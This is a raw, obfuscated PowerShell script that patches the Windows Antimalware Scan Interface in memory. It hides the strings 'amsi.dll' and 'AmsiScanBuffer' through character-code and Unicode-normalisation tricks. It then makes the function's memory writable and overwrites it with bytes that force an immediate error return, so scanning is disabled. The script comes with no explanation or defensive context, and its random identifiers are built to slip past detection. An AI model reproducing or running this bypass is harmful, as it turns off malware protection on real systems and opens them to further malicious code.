$KGOqmK9X5HcYurN = @"
using System;
using System.Runtime.InteropServices;
public class KGOqmK9X5HcYurN {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr piPjVrpsMfjNEJa, string ll2);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr d1v, UIntPtr OHBqmMnz4ZPrUyWD, uint J6KVckUPoznqaA0NtVP1, out uint MfFEJduUemSw8r3duodW);
}
"@

Add-Type $KGOqmK9X5HcYurN

$Yl7vIkWN = [KGOqmK9X5HcYurN]::LoadLibrary("$([cHAR]([BYte]0x61)+[CHar]([byte]0x6d)+[CHar]([byTE]0x73)+[CHaR](105)+[ChAR]([byTE]0x2e)+[cHaR](100)+[cHAr](108+16-16)+[chAr](102+6))")
$QaBBUBFPzNAppm = [KGOqmK9X5HcYurN]::GetProcAddress($Yl7vIkWN, "$(('Áms'+'ìSc'+'ánB'+'úff'+'êr').NORmALiZE([CHAR](70+59-59)+[cHaR](111+5-5)+[cHAR]([BytE]0x72)+[ChAr](109*53/53)+[CHAr]([bYtE]0x44)) -replace [chAr]([Byte]0x5c)+[char](112*74/74)+[chaR]([BYTe]0x7b)+[CHar](77)+[CHAR](110*41/41)+[chAr]([bYTe]0x7d))")
$p = 0
[KGOqmK9X5HcYurN]::VirtualProtect($QaBBUBFPzNAppm, [uint32]5, 0x40, [ref]$p)
$lzX4Sa38CeygIM = "0xB8"
$GOnW1cLd8 = "0x57"
$bXpuVb = "0x00"
$JKUdopkkxOToUWckK13z = "0x07"
$unGyQaRaxjIyP = "0x80"
$xguwYeJ_uGvGZFXW = "0xC3"
$zoOSkrZrIVtsJr9CLKp = [Byte[]] ($lzX4Sa38CeygIM,$GOnW1cLd8,$bXpuVb,$JKUdopkkxOToUWckK13z,+$unGyQaRaxjIyP,+$xguwYeJ_uGvGZFXW)
[System.Runtime.InteropServices.Marshal]::Copy($zoOSkrZrIVtsJr9CLKp, 0, $QaBBUBFPzNAppm, 6)